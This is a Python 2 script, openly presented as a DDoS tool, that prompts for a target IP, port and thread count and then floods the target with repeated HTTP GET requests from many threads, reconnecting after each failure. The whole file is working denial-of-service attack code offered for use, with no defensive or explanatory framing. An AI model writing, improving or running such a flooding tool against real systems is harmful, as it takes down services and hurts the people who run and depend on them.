#! /usr/bin/env python

import socket
import sys
import thread
import time

threadsstarted = 0
HTTP_request = "GET / HTTP/1.0 \r\n\r\n"
IP = raw_input ('Enter an IP to DDOS: ')
portinput = raw_input ('Port to send HTTP requests to (press enter for the default port 80): ')
threadamount = int(raw_input ('Threads to run concurrently: '))
isdefault = False

if (not portinput):
	port = 80
	isdefault = True
else:
	port = int(portinput)

if (sys.getsizeof(IP) < 40 or sys.getsizeof(IP) > 52):
	print "[-] Invalid IP address"
	sys.exit(1)
	
print "[+] Review of variables: "
time.sleep(0.5)

print "[+] IP set to: " + IP 
time.sleep(0.5)

if (isdefault == True):
	print "[+] Using the default port 80"
	time.sleep(0.5)
elif (isdefault == False):
	print "[+] Port set to: " + str(port)
	time.sleep(0.5)
	
print "[+] Number of threads set to: " + str(threadamount)
time.sleep(0.5)

commence = raw_input ('[+] Do you wish to proceed with the DDOS attack? (Y/n): ')

if (commence == "n" or commence == "N" or commence == "no" or commence == "No"):
	sys.exit(0)

seconds = 5
while (seconds != 0):
	print "\r" + "[+] Commencing in " + str(seconds),
	time.sleep(1)
	seconds -= 1
	
def ddos (threadname):
	n = 0
	reconnect = 0
	try:
		s = socket.socket()
		print threadname + ": [+] Connecting to " + IP + "\n"
		s.connect ((IP, port))
	except Exception, error:
		print threadname + ": [-] Error = " + str(error) + "\n"
	while (1):
		try:
			if (reconnect == 1):
				print threadname + ": [+] Reconnecting to " + str(IP) + "..." + "\n"
				s = socket.socket()
				s.connect ((IP, port))
				print threadname + ": [+] Successfully reconnected"
				reconnect = 0
			print threadname + ": [+] " + str(n) + " HTTP requests sent." + "\n"
			s.sendall(HTTP_request)
			if (n == 0):
				print threadname + ": [+] Connection succeeded" + "\n"
				anshttp = s.recv(4096)
				print threadname +  ": [+] Answer from HTTP service: \n" + anshttp + "\n"
				HTTP_answer = open("HTTP_Answer.txt", "a")
				HTTP_answer.write(anshttp)
				HTTP_answer.close()
			n+= 1
		except Exception, error:
			print threadname + ": [-] Error = " + str(error) + "\n"
			reconnect = 1
while (threadsstarted != threadamount):			
	try:
		thread.start_new_thread (ddos, ("Thread " + str(threadsstarted),))
		threadsstarted += 1
	except Exception, error:	
		print "[-] Error = " + str(error)
		sys.exit(1)	

while 1: 
	pass